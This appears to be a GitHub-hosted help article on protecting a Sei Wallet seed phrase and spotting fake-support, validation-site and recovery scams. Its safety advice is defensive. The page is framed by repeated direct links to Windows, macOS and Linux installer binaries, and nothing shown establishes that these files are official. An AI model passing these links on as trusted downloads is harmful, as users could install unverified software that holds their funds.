![Sei Wallet](https://github.com/sei-chain/sei-wallet-help/raw/main/assets/banner-article.png)

<h1 align="center">Seed phrase safety and the support scams around Sei Wallet</h1>

<p align="center">How the phrase is taken, how fake support works, and how to check a claim.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Your seed phrase is the account. Twelve or twenty-four words that reconstruct every key the wallet derives, which is why the entire security model reduces to one rule: the phrase is entered once, during setup or restore, and never again for any other reason.

Everything else in this article follows from that. There is no recovery team, no validation step, no migration that needs it, and no support process that legitimately asks for it — because the operator states plainly that it cannot move, freeze or recover funds. A company that cannot touch your balance has no reason to need your phrase, and anyone who asks is not that company.

This is also where the product being young matters. A self-custody wallet with no recovery path attracts exactly the scams that promise a recovery path.

## What the phrase is, mechanically

A seed phrase encodes a number. From it, the wallet derives keys, and from keys come addresses. Two consequences are worth holding onto:

- **Anyone with the phrase has every account derived from it**, on every chain, not just this one.
- **Anyone without it has nothing**, including you, if you lose it. There is no reset, no identity check and no operator-side backup.

That symmetry is the whole design. It cannot be softened for you without being softened for a thief.

## The four shapes every scam takes

Nearly all seed theft reduces to one of these. They differ in packaging, not in mechanism.

**The fake support agent.** A reply to your public question, a direct message, an account with the product's name and a plausible avatar. They offer to "check your wallet", "sync the node", "whitelist your address" or "help with the stuck transaction". Each of those tasks requires your phrase, and none of them exists.

**The validation site.** A page that looks like a wallet interface and asks you to "verify", "connect", "restore" or "migrate" by entering words. Sometimes it shows a progress bar. Sometimes it asks for the words in a randomised order to appear careful. The order does not matter; the page is the theft.

**The recovery offer.** You post that you lost access or sent funds to the wrong address, and someone offers to recover them for a fee, or for "gas", or after you install a remote-access tool. Funds sent to a wrong address cannot be recalled, and a lost phrase cannot be reconstructed. The offer is the scam, and the fee is the second loss.

**The helpful file.** A "wallet update", a "patch", a "derivation fixer" or a screen-sharing session that ends with someone reading your phrase off your own screen. Anything that asks you to install something to fix an account problem is in this category.

## How real support behaves

There is a test that works without knowing anything about the company: legitimate support never needs the thing that would let it steal from you. Concretely, a real support process will:

- discuss your issue without asking for the phrase or a private key;
- point you to public documentation rather than requesting remote access;
- never ask you to move funds to a "safe" address it supplies;
- accept that you cannot prove ownership by revealing a secret.

One caveat worth stating honestly: the operator describes a security contact, but the well-known security file the site points to returned nothing when fetched on 12 November 2026. That does not create a scam risk by itself, but it does mean you cannot verify a support channel against a published signature — so treat every inbound "support" message as unverified by default.

## If you have already entered the phrase

Act as though the account is compromised, because it is. The words are copied and the copy does not expire.

1. **Create a new wallet from a new phrase**, on a device you trust.
2. **Move everything** — liquid balance, and staked positions by unbonding them — to the new address. Unbonding takes time, which is why this is urgent; the mechanics are in [the staking mechanics](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md).
3. **Do not top up the old account** to pay fees if you can avoid it. If you must, send the minimum, and expect it to be taken.
4. **Stop using the old phrase everywhere**, including any other chain it secured. The same words derive accounts on other networks.
5. **Do not pay anyone who offers to "secure" or "recover" the compromised wallet.** That is the same scam arriving twice.

If the funds are already gone, report it and move on. There is no legitimate service that can reverse a confirmed transaction, and the ones that claim otherwise are charging you to learn that.

## Protecting the phrase offline

The threats above are remote. The remaining ones are physical, and they are just as effective.

- **Write it on paper or metal, by hand.** Not a photograph, not a note in a password manager, not a draft email. A cloud-synced image is one account compromise away from being public.
- **Keep it out of the same place as the device.** A theft that takes both is a total loss; two locations is the point.
- **Never type it into a computer to "check" it.** Verification is a restore on a device you control, not a web form.
- **Assume anyone who can see your screen can see it.** Screenshots, screen sharing and shoulder-surfing all count.
- **Do not split it into "clever" pieces with a scheme you invented.** Most improvised schemes lose the phrase rather than protect it.

## Verifying what you installed, and what you approve

Two other attack surfaces are worth closing while you are here, because neither involves the phrase and both drain accounts.

**The download.** A lookalike site, an advertisement or a re-uploaded installer gives you a wallet that runs normally while sending your signature elsewhere. The checks that are actually possible today are in [verifying the installer](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-verify-a-download-before-installing.md).

**The approval.** A transaction prompt is a request to authorise something specific. Read the recipient and the amount on the device or the confirmation screen. Click-through approval is how a plain transfer turns into a contract call with a different effect. What the software can and cannot protect you from is set out in [whether the wallet is safe](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md).

## Frequently asked questions

**Does Sei Wallet support ever ask for my seed phrase?** No legitimate process does. Setup and restore are the only places the words are entered, and both happen locally.

**Someone asked me to validate my wallet. Is that real?** No. "Validation" is not a wallet operation. It is a request for your phrase with a technical-sounding name.

**Can a stolen seed phrase be recovered?** No. Once the words are known, the accounts are compromised. The only remedy is a new wallet and moving the funds.

**I sent SEI to the wrong address. Can support reverse it?** No. Confirmed transactions are final, and the operator states it cannot move or recover funds.

**Is it safe to store the phrase in a password manager?** It is better than a photograph in a chat, and worse than paper or metal kept offline. If the manager's account is compromised, so is the wallet.

**Do I need a new phrase for a second wallet?** Not necessarily — one phrase can derive many accounts — but a phrase used in a second application is exposed to that application's security.

**What about the address formats?** Separate problem, same account: one address can appear as `0x…` and as `sei1…`. [The address forms](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) explains the mapping, and none of it requires a phrase to be typed anywhere.

**Should I use MetaMask instead to avoid this?** It moves the risk rather than removing it — [the MetaMask option](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) has its own setup traps, and every EVM wallet faces the same approval scams. What the app is and who runs it is covered in [what the app is and who runs it](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [How to stake SEI in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/how-to-stake-your-first-coins.md)
- [How to verify a Sei Wallet download](https://github.com/sei-chain/sei-wallet-setup/blob/main/how-to-verify-a-download-before-installing.md)
- [Is Sei Wallet safe? What self-custody does and does not protect](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
